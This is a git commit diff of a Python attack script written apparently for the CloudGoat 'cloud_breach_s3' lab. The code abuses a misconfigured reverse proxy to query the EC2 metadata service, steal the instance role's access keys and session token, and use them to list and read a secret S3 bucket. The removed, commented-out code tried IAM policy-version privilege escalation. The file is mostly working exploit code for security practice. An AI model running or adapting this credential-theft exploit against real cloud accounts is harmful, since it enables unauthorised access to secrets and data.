715666f02bf0981d96cac3877644680fbd3aa750
Yaroslav Kucher <jharos@example.com>
2023-06-22 08:42:18 +0400

    script 2 drafted

--- script2/script2matrix.py
+++ script2/script2matrix.py
@@ -1,21 +1,20 @@
 import boto3
 import json
 import requests
+import sys
+import csv
+
 
 # This script will get high privileged EC2 instance credentials via reverse proxy vulnerability
 # Then sensitive date will be obtained from s3 buckets using the high privileged credentials
 # As the result it will invoke the lamda funcition to indicate the success of the attack
 # https://resources.infosecinstitute.com/topic/cloudgoat-walkthrough-series-cloud-breach-s3/
 
-
-
-
-
-
-
-# Load various credentials from .secure/credentials.json
+# Load credentials from .secure/credentials.json
 with open('.secure/credentials.json', 'r') as file:
     credentials = json.load(file)
+
+# Load credentials from appropriate profile 
 credentials_profile='scenario2'
 
 access_key_id=credentials[credentials_profile]['aws_access_key_id']
@@ -23,59 +22,45 @@ secret_access_key=credentials[credentials_profile]['aws_secret_access_key']
 region=credentials[credentials_profile]['region']
 lambda_function_name=credentials[credentials_profile]['lambda_function_name']
 reverse_proxy_ip=credentials[credentials_profile]['reverse_proxy_ip']
+s3_secret_bucket_name=credentials[credentials_profile]['s3_secret_bucket_name']
+
 
 proxy_url = 'http://' + reverse_proxy_ip + '/latest/meta-data/iam/security-credentials'
-proxt_headers = {'Host': '169.254.169.254'}
+proxy_headers = {'Host': '169.254.169.254'}
 
-response = requests.get(proxy_url, headers=headers)
-
+response = requests.get(proxy_url, headers=proxy_headers)
 if response.status_code == 200:
-    security_credentials = response.text
-    print(security_credentials)
+    proxy_url = proxy_url + '/' + response.text
+    response = requests.get(proxy_url, headers=proxy_headers)
+
+    if response.status_code == 200:
+        print('SUCCESS:High privileged EC2 instance credentials obtained')
+        data = response.json()
+        ec2_access_key = data['AccessKeyId']
+        ec2_secret_key = data['SecretAccessKey']
+        ec2_token = data['Token']
+    else:
+        print('Error:', response.status_code)
+        sys.exit(1)
 else:
     print('Error:', response.status_code)
+    sys.exit(1)
 
-# iam = boto3.client(
-#     'iam',
-#     aws_access_key_id=access_key_id,
-#     aws_secret_access_key=secret_access_key
-# )
 
-# response = iam.list_attached_user_policies( UserName=iamuser)
+s3 = boto3.client(
+     's3',
+     aws_access_key_id=ec2_access_key,
+        aws_secret_access_key=ec2_secret_key,
+        aws_session_token=ec2_token,
+        region_name=region
+)
 
-# # Obtain the policy arn of the first policy attached to the user
-# PolicyArn = response['AttachedPolicies'][0]['PolicyArn']
-# print ('INFO:Vulnerable policy detected PolicyArn:', PolicyArn)
-# response = iam.list_policy_versions( PolicyArn=PolicyArn)
+# Find target bucket among all buckets
 
-# VersionDefaultId = ''
-# VersionFound = False
-# Version2Enable = ''
-
-# for Version in response['Versions']:
-#     if Version['IsDefaultVersion'] == True:
-#         VersionDefaultId = Version['VersionId']
-#         print('INFO:Version', VersionDefaultId ,'is detected as the default version of the policy', PolicyArn)
-#     for Statement in iam.get_policy_version(PolicyArn=PolicyArn, VersionId=Version['VersionId'])['PolicyVersion']['Document']['Statement']:
-#         if Statement['Action'] == 's3:ListAllMyBuckets' and Statement['Resource'] == '*' and Statement['Effect'] == 'Allow':
-#             VersionFound=True
-#             Version2Enable=Version['VersionId']
-#             print('SUCCESS: Version', Version2Enable ,'is detected as the PRIVILIGED version of the policy', PolicyArn)
+for bucketname in s3.list_buckets()['Buckets']:
+    if (bucketname['Name']== s3_secret_bucket_name):
+        print ('SUCCESS:Vulnerable bucket detected:', bucketname['Name'])
+        print ('<==========List of objects in the bucket:')
+        for object in s3.list_objects(Bucket=bucketname['Name'])['Contents']:
+            print (object['Key'])
             
-# if VersionFound == True:
-#      iam.set_default_policy_version(PolicyArn=PolicyArn, VersionId=Version2Enable)
-#      print('==========>Version', Version2Enable ,'is temporarily established as default version')
-#      print ('<==========List of S3 buckets:')
-
-#      s3 = boto3.client(
-#         's3',
-#         aws_access_key_id=access_key_id,
-#         aws_secret_access_key=secret_access_key)
-#      for bucketname in s3.list_buckets()['Buckets']:
-#          print(bucketname['Name'])
-
-#      print('==========>Version', VersionDefaultId ,'is restored back as default.')
-#      iam.set_default_policy_version(PolicyArn=PolicyArn, VersionId=VersionDefaultId)
-
-# else:
-#     print('No Version found with the correct permissions')
